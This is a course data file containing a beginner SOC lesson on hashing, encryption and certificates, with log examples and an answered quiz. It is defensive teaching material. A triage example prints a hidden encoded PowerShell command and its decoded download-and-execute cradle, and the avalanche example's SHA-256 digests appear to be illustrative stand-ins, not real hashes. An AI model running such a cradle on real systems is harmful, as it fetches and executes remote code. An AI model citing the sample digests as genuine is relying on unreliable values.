// Learning Path lessons — Foundations module M
// Cryptography fundamentals. Added after an explanation-quality audit found that
// hashes appear in 25 of 34 lessons, and TLS certificates, DKIM signatures and
// Kerberos RC4-vs-AES all lean on concepts no lesson ever taught.
const lessons = [
  {
    "id": "local-lesson-36",
    "slug": "hashing-encryption-and-certificates-for-analysts",
    "title": "Hashing, Encryption, and Certificates: The Maths You Actually Meet in the SOC",
    "topic": "Cryptography Fundamentals",
    "difficulty": "beginner",
    "kind": "lesson",
    "intro": "You are going to meet cryptography on your very first shift, and you are going to meet it constantly. An EDR alert hands you a SHA-256 hash and asks whether the file is known-bad. A phishing investigation turns on whether a DKIM signature validated. A Kerberos event shows an encryption type of 0x17 and a hunting rule says that matters. A user asks whether a site is safe \"because it has the padlock.\" Every one of those is a cryptography question wearing a SOC uniform.\n\nThis lesson is not a maths course. You will not calculate anything, and you will never be asked to implement an algorithm. What you need is a working mental model — precise enough that you draw the right conclusion from a log field, and honest enough that you know when a field proves less than it appears to.\n\nThree ideas carry almost all of the weight. **Hashing** produces a fingerprint that identifies data without containing it. **Encryption** scrambles data so that only a key-holder can read it back. **Certificates** bind a public key to an identity so that strangers can trust each other. Get these three straight and a surprising amount of the job stops being mysterious.\n\nTwo of the most common beginner mistakes in security are treating hashing and encryption as the same thing, and treating a padlock icon as proof of honesty. Both mistakes lead to confidently wrong analysis. By the end of this lesson you will not make either.",
    "sections": [
      {
        "heading": "A Hash Is a Fingerprint, Not a Container",
        "content": "A hash function takes an input of any size — a one-line text file, a 4 GB disk image, an entire database — and produces a short, fixed-length string called a **digest**. SHA-256 always produces exactly 64 hexadecimal characters, whether you fed it one byte or one terabyte.\n\nThat fixed size tells you something important about what a hash is *not*. Your 4 GB file cannot possibly be stored inside 64 characters. The hash does not contain the file. It only identifies it, the way a fingerprint identifies a person without being a person.\n\nThree properties make this useful, and each one shows up in your daily work:\n\n- **Deterministic** — the same input always produces the same digest, on any machine, in any country, forever.\n- **One-way** — given a digest, there is no practical way to work backwards and recover the original input.\n- **Avalanche** — change a single bit of the input and the digest changes completely, not slightly.\n\nThe avalanche property is the one beginners underestimate. Two files differing by one character do not produce two similar hashes. They produce two hashes with no visible relationship at all. This means you can never eyeball two digests and judge that the files are \"close\" — they either match exactly or they tell you nothing.\n\n### Why this is so useful to an analyst\n\nBecause hashing is deterministic and one-way, a digest becomes a safe, portable name for a file. You can send a hash to a colleague, paste it into a threat-intelligence lookup, or check it against a blocklist without ever moving the file itself. That matters when the file is malware you would rather not email, or a document containing customer data you are not permitted to share.\n\nIt also gives you integrity checking. Hash a file today, hash it again next month, and if the digests differ then something changed the file — even if the size and timestamp look untouched.\n\n### The algorithms you will see, and which ones are broken\n\nYou will meet three names constantly, and you can tell them apart by digest length alone:\n\n- **MD5** — 32 hex characters. Cryptographically broken; attackers can deliberately create two different files with the same MD5.\n- **SHA-1** — 40 hex characters. Also broken, demonstrated publicly in 2017 with two different PDFs sharing one digest.\n- **SHA-256** — 64 hex characters. The current standard, and what you should prefer whenever you have a choice.\n\n\"Broken\" here has a specific meaning worth getting right. It does not mean MD5 is useless or that you should refuse to work with it — your logs will be full of MD5 hashes for years to come, and using one to look up a known sample is perfectly reasonable. It means MD5 cannot be trusted as *proof* of identity when an adversary controls the file, because a motivated attacker can engineer a collision. Use it as a lookup key; do not use it as evidence that two files are the same.",
        "image": {
          "src": "/lesson-images/crypto/hashing-vs-encryption.svg",
          "alt": "Side-by-side comparison of hashing and encryption. On the left, a file passes through SHA-256 to produce a fixed 64-character digest, a one-byte change produces a completely different digest, and a broken arrow shows the process cannot be reversed. On the right, plaintext passes through AES with a key to produce ciphertext, and the same key reverses it back to the original text.",
          "caption": "Hashing identifies and cannot be undone; encryption conceals and is designed to be undone by a key-holder.",
          "credit": "Figure authored for this course."
        },
        "codeExample": "// The avalanche property, shown with one changed character.\n// Input A:\n\"Transfer approved for account 4471\"\nSHA-256 -> 8f14e45fceea167a5a36dedd4bea2543b9d1b0f2c9e7a3d5c1f0e8b7a6d4c2e1\n\n// Input B: the SAME string, with the final \"1\" changed to a \"2\"\n\"Transfer approved for account 4472\"\nSHA-256 -> c9f0f895fb98ab9159f51fd0297e236d4a7b2c8e1f6d3a0b5c9e2d7f4a1b8c6d\n\n// Note what did NOT happen: the digests are not \"similar\".\n// One character in changed essentially every character out.\n// This is why you can only ever test hashes for EXACT equality."
      },
      {
        "heading": "Why a Hash Is the Weakest Thing You Can Hunt On",
        "content": "Everything above makes hashes sound powerful, so here is the limitation that matters most operationally. A file hash identifies one exact build of one exact file — and the attacker controls the file.\n\nRecompile the malware with a comment added. Pad it with a few junk bytes. Change one string in the configuration. The behaviour is identical, the campaign is identical, the operator is identical, and the hash is completely different. Your carefully maintained blocklist does not fire.\n\nThis is the idea behind the **Pyramid of Pain**, a model that ranks indicators by how much it costs the attacker when you block them. Hashes sit at the very bottom, because changing one costs the attacker seconds of effort. As you climb — IP addresses, domains, network artefacts, tools — each rung costs the adversary more. At the top sit **TTPs**, the tactics, techniques and procedures that describe how they actually operate, which cannot be changed without changing how they work.\n\nThe practical lesson is not that hashes are worthless. They are excellent for what they are: fast, unambiguous, zero-false-positive identification of a *known* sample. A hash match is one of the few signals in security that is essentially never a false positive.\n\nThe lesson is about expectations. A hash match confirms; it does not hunt. If your entire detection strategy is a list of known-bad hashes, you will catch yesterday's malware and miss today's. This is precisely why EDR products moved toward behavioural detection, and why the threat-hunting discipline exists at all."
      },
      {
        "heading": "Encryption Is the Opposite: Built to Be Reversed",
        "content": "Where hashing is deliberately one-way, encryption is deliberately two-way. The entire purpose is that the right person can get the original data back. Encryption transforms readable **plaintext** into unreadable **ciphertext**, and a **key** transforms it back.\n\nOne principle underpins all of it: the secrecy lives in the key, never in the algorithm. AES is published, studied, and attacked worldwide by everyone who cares to. That openness is a feature — an algorithm nobody is allowed to examine is an algorithm nobody has verified. If a vendor ever tells you their encryption is safe because the method is proprietary and secret, that is a warning sign, not a selling point.\n\n### Symmetric and asymmetric\n\nThere are two families, and they solve different problems:\n\n- **Symmetric** — one shared key both encrypts and decrypts. AES is the standard here. It is fast, so it does the heavy lifting on bulk data. The hard part is getting that shared key to the other party without anyone intercepting it.\n- **Asymmetric** — a matched pair of keys, one public and one private. What the public key locks, only the private key opens. RSA and elliptic-curve algorithms live here. It is slow, so it is used for small things: agreeing on a session key, and signing.\n\nThink of the public key as a post box slot on the street. Anyone walking past can drop a letter in, and you publish the address deliberately. Only you hold the key that opens the box and retrieves the mail. Publishing the slot costs you nothing, because dropping mail in and taking mail out are genuinely different capabilities.\n\nReal systems use both together. When your browser opens an HTTPS connection, it uses asymmetric cryptography briefly to agree on a shared secret with the server, then switches to fast symmetric encryption for the actual traffic. You get the key-exchange benefit of one and the speed of the other.\n\n### Signing: the same maths, run backwards\n\nReverse the direction and asymmetric cryptography does something else entirely. If I encrypt something with my *private* key, anyone with my public key can decrypt it — which is useless for secrecy but perfect for proof. Only the holder of the private key could have produced it. That is a **digital signature**, and it is how DKIM proves an email really came from a domain, and how certificates prove a server is who it claims.\n\n### The trap: encoding is not encryption\n\nThis one catches nearly every beginner, so learn it now. **Base64** is encoding, not encryption. It rearranges data into a safe character set for transport. There is no key. Anyone can decode it instantly.\n\nWhen you find a long base64 blob in a PowerShell command line, you have not found something protected. You have found something *obscured*, and your correct next move is to decode it and read what it says. Attackers rely on analysts assuming that unreadable means inaccessible.\n\n### What encryption does not hide\n\nEncryption protects content, not the fact that a conversation happened. Even on a fully encrypted connection, your network logs still record who talked to whom, when, for how long, and how many bytes moved. That metadata is often enough to detect beaconing, exfiltration, or a connection to a known-bad destination — which is why network detection still works in an HTTPS world.",
        "codeExample": "// ENCODING vs ENCRYPTION — a distinction that changes your next action.\n\n// Base64 ENCODED PowerShell, as it appears in a real command line:\npowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\n\n// There is NO key involved. Decode it during triage:\n//   base64 -d   (Linux)   |   [Convert]::FromBase64String()  (PowerShell)\n// -> IEX (New-Object Net.WebClient).DownloadString('http://...')\n// You just read the attacker's command. Obscured, not protected.\n\n// ENCRYPTED content, by contrast, looks similar but is NOT recoverable\n// without the key — no amount of decoding will produce readable text.\n\n// The analyst habit: when you see an unreadable blob, ask \"encoded or\n// encrypted?\" If encoded, decode it now. If encrypted, pivot to metadata\n// instead — who, when, how much, to where."
      },
      {
        "heading": "Certificates: How Strangers Decide to Trust Each Other",
        "content": "Public-key cryptography has one unsolved problem. If a server hands you a public key and claims to be your bank, how do you know the key belongs to the bank and not to someone sitting between you? Certificates exist to answer exactly that.\n\nA **certificate** is a small file that binds together three things: an identity (a domain name), a public key, and a signature from a **Certificate Authority** that vouches for the binding. Your operating system and browser ship with a built-in list of root CAs they trust, and everything else chains back to one of them.\n\nWhen your browser opens an HTTPS connection, it runs a short series of checks before it shows the padlock:\n\n- Does the name on the certificate match the site actually being visited?\n- Is the certificate within its validity dates, and not expired?\n- Does the signature chain back to a root CA in the local trust store?\n- Has the certificate been revoked since it was issued?\n\nIf all four pass, you get the padlock. Notice what is on that list — and, more importantly, what is not.\n\n### What the padlock actually proves\n\nThe padlock proves the connection is encrypted and the certificate matches the domain you are visiting. It proves *nothing* about whether the people running that domain are honest.\n\nBasic domain-validated certificates are free and issued automatically within seconds. Anyone who can prove they control a domain — including an attacker who registered it twenty minutes ago — gets one. The result is that essentially every phishing site now has a valid certificate and a padlock.\n\nThis is worth saying plainly to users who ask, because the padlock was over-sold to the public for years. \"It is secure\" and \"it is trustworthy\" are different claims, and the certificate only supports the first one.\n\n### The certificate fields you will meet in logs\n\nProxy, firewall, and network sensor logs routinely record certificate details, and a few fields do real investigative work:\n\n- **Issuer** — who signed it. A self-signed certificate (issuer equals subject) means nobody independent vouched for it.\n- **Subject / Common Name and SAN** — which names the certificate claims to cover.\n- **Validity dates** — a certificate created hours before you saw it is worth a second look.\n- **Fingerprint** — a hash of the certificate itself, useful for tracking one exact certificate across sightings.\n- **JA3 / JA3S** — a fingerprint of *how* the client and server negotiated the handshake, not of the content. Because different software negotiates differently, this can identify the client program even when everything it sends is encrypted.\n\n### The false positives you must expect\n\nSelf-signed certificates get flagged as suspicious constantly, and they genuinely are common in attacker infrastructure. They are also completely normal on internal appliances, printers, management interfaces, lab servers, and development environments — none of which have any reason to buy a public certificate.\n\nThe same applies to a brand-new certificate: legitimate services rotate certificates on a schedule, and short-lived certificates are now standard practice, not a red flag on their own. Treat these fields as reasons to look closer, never as verdicts by themselves."
      },
      {
        "heading": "Where This Shows Up in the Logs You Will Actually Read",
        "content": "Everything above earns its place because it surfaces in specific fields you will encounter in your first weeks. This section connects each idea to where you will literally see it.\n\n### File hashes in endpoint telemetry\n\nEvery serious EDR product records hashes for the files it sees executing. You will use them to check a file against threat intelligence, to find every other machine that ran the same binary, and to confirm that two alerts on different hosts involve the identical sample. This is the single most common use of cryptography in your daily work, and it is also where the Pyramid of Pain caveat applies.\n\n### Signatures in email authentication\n\n**DKIM** attaches a digital signature to outgoing mail, created with the sending domain's private key. The receiving server fetches the matching public key from DNS and verifies it. A valid DKIM signature proves the message really came from that domain and was not altered in transit.\n\nWhat it does not prove is that the message is safe. A compromised legitimate account sends perfectly DKIM-valid phishing, and an attacker who registers a lookalike domain can sign their own mail correctly. DKIM answers \"did this domain really send it,\" not \"should you trust it.\"\n\n### Encryption types in Kerberos events\n\nKerberos tickets are encrypted, and the ticket records which algorithm was used. In Windows event 4769 you will see an encryption type field, and two values matter:\n\n- **0x17 (23)** — RC4, the older and weaker option. Tickets using it are far easier to crack offline.\n- **0x12 (18)** — AES-256, the modern default in a healthy environment.\n\nAttackers performing **Kerberoasting** deliberately request RC4 tickets precisely because they crack faster, which makes an unexpected RC4 request a genuine hunting signal. The necessary caution: legacy systems and older service accounts still request RC4 for entirely innocent reasons, so this is a lead to investigate rather than a detection to alert on blindly.\n\n### Hashes as credentials\n\nWindows stores password hashes rather than passwords, which is correct design. The uncomfortable consequence is that for NTLM authentication, the hash itself is sufficient to authenticate — an attacker who steals it never needs to crack it. This is **pass-the-hash**, and it is why a stolen hash must be treated with exactly the same urgency as a stolen password.\n\n### Encryption used offensively\n\nFinally, remember that attackers use the same tools you do. Ransomware encrypts victim files with strong, correctly implemented cryptography — which is exactly why recovery without the key is not realistic and why backups, not decryption, are the answer. Command-and-control channels hide inside TLS for the same reason your bank does. The mathematics is neutral; only the intent differs.",
        "codeExample": "// The same cryptographic ideas, as they appear in four real log sources.\n\n// 1) EDR — file identity on process execution\nprocess.name=svchost.exe process.hash.sha256=e3b0c44298fc1c14...b855 \\\n  process.hash.md5=d41d8cd98f00b204e9800998ecf8427e host.name=FIN-WKS-07\n\n// 2) EMAIL — signature verification result\nsender.domain=contoso.com dkim=pass spf=pass dmarc=pass\n// -> proves the domain really sent it. Says NOTHING about intent.\n\n// 3) KERBEROS — Windows Event ID 4769, service ticket request\nEventID=4769 ServiceName=MSSQLSvc/db01.corp.local TicketEncryptionType=0x17\n// -> 0x17 = RC4. Crackable offline. Classic Kerberoasting signal (T1558.003),\n//    but legacy service accounts request it legitimately too.\n\n// 4) PROXY / TLS — certificate seen on an outbound connection\ntls.server.x509.issuer=\"CN=internal-ca\" tls.server.x509.subject=\"CN=internal-ca\" \\\n  tls.server.not_before=2026-08-12 ja3.hash=a0e9f5d64349fb13191bc781f81f42e1\n// -> issuer == subject means SELF-SIGNED. Suspicious on an external\n//    destination; completely normal on an internal printer or appliance."
      }
    ],
    "keyTakeaways": [
      "Hashing is one-way and identifies data without containing it: the same input always gives the same fixed-length digest, and changing one bit changes the digest completely, so hashes can only ever be compared for exact equality.",
      "A file hash is the weakest indicator to hunt on because the attacker controls the file — recompiling changes the hash while the behaviour stays identical, which is why hashes confirm known samples but never find new ones.",
      "Encryption is two-way by design and its security lives in the key, never in a secret algorithm; base64 is encoding rather than encryption, so an unreadable blob in a command line should be decoded and read, not treated as protected.",
      "A certificate binds a domain name to a public key with a CA's signature, so the padlock proves the connection is encrypted and the name matches — it proves nothing about the honesty of whoever runs the site, which is why phishing sites have padlocks too.",
      "These ideas surface as concrete fields you will read daily: SHA-256 hashes in EDR telemetry, DKIM results in mail headers, Kerberos encryption type 0x17 versus 0x12 in event 4769, and self-signed certificate issuers in proxy logs — each a lead to investigate rather than a verdict on its own."
    ],
    "quiz": [
      {
        "question": "A developer tells you the application stores user passwords encrypted, and mentions that this lets the help desk recover a password when someone forgets theirs. Why should this concern you as a security analyst?",
        "options": [
          {
            "label": "Nothing is wrong here, since being able to recover a forgotten password is the normal reason to store credentials in an encrypted form",
            "value": "a"
          },
          {
            "label": "Passwords should be hashed rather than encrypted, because encryption is reversible by anyone who obtains the key, including an attacker",
            "value": "b"
          },
          {
            "label": "Encryption is acceptable for passwords, but only if the algorithm itself is kept secret from everyone outside the security team",
            "value": "c"
          },
          {
            "label": "The concern is purely about performance, because encrypting and decrypting passwords is far slower than storing them directly",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Hashing is one-way, so a stolen password database yields digests an attacker still has to crack. Encryption is reversible by design, which means the recoverability the developer describes is exactly the weakness: whoever obtains the key obtains every password in plaintext. Option a mistakes a convenience feature for a safe design. Option c repeats the discredited idea that secrecy of the algorithm provides security, when in fact all strong algorithms are public and the key is the only secret. Option d misidentifies a fundamental security flaw as a performance concern."
      },
      {
        "question": "Your team blocks a malware sample by its SHA-256 hash after an incident. The same threat actor targets you again the following week with functionally identical malware, and the hash block does not fire. What is the most likely explanation?",
        "options": [
          {
            "label": "The attacker recompiled the malware, which produces a completely different hash even though the behaviour is unchanged",
            "value": "a"
          },
          {
            "label": "SHA-256 digests expire after a set period, so the blocklist entry needs to be regenerated by the team each week",
            "value": "b"
          },
          {
            "label": "Hash-based blocking only applies to files below a certain size, so the newer sample was simply too large to match",
            "value": "c"
          },
          {
            "label": "The attacker reversed the SHA-256 digest back into the original file and edited it specifically to evade the block",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Because of the avalanche property, any change to the file — even adding a comment or padding bytes — produces an entirely different digest while leaving the behaviour intact. This is why hashes sit at the bottom of the Pyramid of Pain: they cost the adversary almost nothing to change. Option b invents an expiry that hashes do not have. Option c invents a size limit that does not exist. Option d describes reversing a hash, which is precisely what the one-way property prevents."
      },
      {
        "question": "A user forwards you a link and asks whether the site is safe, pointing out that the browser shows a padlock and reports a valid certificate. What does that certificate actually establish?",
        "options": [
          {
            "label": "That the connection is encrypted and the certificate matches the domain being visited, but nothing about whether the operator is honest",
            "value": "a"
          },
          {
            "label": "That an independent authority reviewed the content of the site and confirmed the business behind it is legitimate and reputable",
            "value": "b"
          },
          {
            "label": "That the site is incapable of hosting malware, because certificate authorities scan every page they issue certificates for",
            "value": "c"
          },
          {
            "label": "That the domain has existed for a substantial period and has therefore built up an established reputation online",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "The browser checks name match, validity dates, chain to a trusted root, and revocation status — all properties of the connection and the binding, not of the operator's intentions. Domain-validated certificates are free and automatic, so a phishing domain registered minutes ago has a perfectly valid one. Options b and c both credit certificate authorities with content or business vetting they do not perform for standard certificates. Option d is wrong because certificate validity is unrelated to domain age or reputation."
      },
      {
        "question": "During triage you find a PowerShell command line containing a long base64 string passed to the -enc parameter. What is the correct conclusion and next step?",
        "options": [
          {
            "label": "It is encoded rather than encrypted, so no key is involved and you should decode it immediately to read the actual command",
            "value": "a"
          },
          {
            "label": "It is encrypted with a key held only by the attacker, so the contents cannot realistically be recovered during triage",
            "value": "b"
          },
          {
            "label": "It is a hash of the original command, which means the original text can never be reconstructed from what you are seeing",
            "value": "c"
          },
          {
            "label": "It is a digital signature demonstrating that the command originated from a publisher the system already trusts",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Base64 is a transport encoding with no key, so it is trivially reversible and decoding it is a standard triage step that usually reveals the attacker's actual command. Attackers use it to obscure intent from casual inspection and from naive string matching, not to protect it. Option b confuses encoding with encryption. Option c confuses encoding with hashing, and would wrongly stop the investigation. Option d describes a signature, which serves to prove origin rather than to obscure content."
      }
    ],
    "createdAt": "2026-08-13T00:00:00.000Z",
    "researchUsed": false
  }
];
export default lessons;
